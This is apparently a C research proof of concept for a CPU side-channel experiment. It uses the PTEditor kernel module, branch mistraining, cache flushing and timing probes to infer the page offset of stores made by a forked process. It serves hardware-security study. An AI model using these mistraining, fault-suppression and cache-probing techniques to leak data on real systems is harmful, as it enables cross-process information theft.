#define _GNU_SOURCE

#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include "utils.h"
#include "ptedit_header.h"

static jmp_buf jmpbuf;
static u32 threshold; // cache hit threshold
static u8 *victim_page, *normal_page, *probe, *garbage; // some handy pages
static volatile u64 size1 = 10, size2 = 11, size3 = 12; // slow branch gadgets

static u8 *setup_page(size_t size, u8 init) {
    u8 *page = mmap(NULL, size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        return NULL;
    }
    memset(page, init, size);
    return page;
}

static void unmap(u8 *page, size_t size) {
    if (page) {
        munmap(page, size);
    }
}

// we only need one bit of information to indicate if PT walk stalls,
// therefore, we only need a probe array with one element,
// and access it if PT walk doesn't stall.
// But we want to avoid using 0 as an index,
// as it can be a default value used for some forwarding (e.g., Meltdown),
// so we use an array with two pages and (only) access the second one.
static void flush_probe() {
    _clflush(probe + getpagesize());
}

static bool check_probe() {
    return _time_maccess(&probe[getpagesize()], 1) < threshold;
}
// end of util functions

// use MISTRAIN_EPOCH - 1 to mistrain, then mispredict
#define MISTRAIN_EPOCH 6

static int store_offset_recovery() {
    int ret = 0;
    u16 offset = 0x888;
    const u32 MEASURES = 100;
    const u32 page_size = getpagesize();
    if (offset & (~0xff8)) {
        fprintf(stderr, "invalide offset %#x.\n", offset);
        return 1;
    }

    pid_t pid = fork();
    if (pid == 0) {
        while (true) {
            _mwrite(&normal_page[offset], 0xff);
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    u8 *pages = setup_page((1 << 9) * page_size, 0x1);
    if (!pages) {
        ret = 3;
        goto mmap_fail;
    }

    for (u32 disp = 0; disp < (1 << 9); disp++) {
        u8 *ptr = pages + disp * page_size;
        u32 counter = 0;
        for (size_t cnt = 1; cnt <= MEASURES * MISTRAIN_EPOCH; cnt++) {
            flush_probe();
            _clflush_v(&size1);
            _clflush_v(&size2);
            _clflush_v(&size3);
            ptedit_invalidate_tlb(ptr);
            _mfence();

            // tmp is all ones if it's going to mispredict
            u64 tmp = ((cnt % MISTRAIN_EPOCH) - 1) & (~0xffff);
            tmp = tmp | (tmp >> 16);

            // only select probe on misprediction
            // equivalent to tmp ? probe : garbage, but branchless
            u8 *arr = (u8 *)SEL_NOSPEC(tmp, probe, garbage);
            _lfence();
            if ((tmp < size1) & (tmp < size2) & (tmp < size3)) {
                // on misprediction, arr points to probe
                // if *ptr is NOT stalled, we can observe signals from probe
                _maccess(&arr[*ptr * page_size]);
            }

            if (check_probe()) {
                counter += 1;
            }
        }

        u16 pte_offset = ((uintptr_t)ptr & 0x1ff000) >> 9;
        printf("%#5x\t%3d\t%3d\n", pte_offset, disp, counter);
    }

    unmap(pages, (1 << 9) * page_size);
mmap_fail:
    kill(pid, SIGKILL);
    return ret;
}

// used for setjmp based fault suppression
static void segv_handler(int signum) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);

    longjmp(jmpbuf, 1);
}

int main(int argc, char **argv) {
    int ret = 0;
    if (ptedit_init()) {
        fprintf(stderr,
                "Failed to initialize PTEditor, is kernel module loaded?\n");
        return -1;
    }

    if (signal(SIGSEGV, segv_handler) == SIG_ERR) {
        fprintf(stderr, "Failed to register segv handler\n");
        ret = -1;
        goto segv_fail;
    }

    threshold = _get_cache_hit_threshold();
    fprintf(stderr, "Cache Hit Threshold: %u\n", threshold);

    victim_page = setup_page(getpagesize(), 0x1);
    normal_page = setup_page(getpagesize(), 0x2);
    probe = setup_page(getpagesize() * 2, 0x0);
    garbage = setup_page(getpagesize() * 2, 0x0);
    if (!victim_page || !normal_page || !probe || !garbage) {
        fprintf(stderr, "Failed to allocate pages.\n");
        ret = -2;
        goto mmap_fail;
    }

    switch (argv[1][0]) {
        case '0':
            ret = store_offset_recovery();
            break;
        default:
            ret = -3;
    }

mmap_fail:
    unmap(victim_page, getpagesize());
    unmap(normal_page, getpagesize());
    unmap(probe, getpagesize() * 2);
    unmap(garbage, getpagesize() * 2);
segv_fail:
    ptedit_cleanup();
    return ret;
}
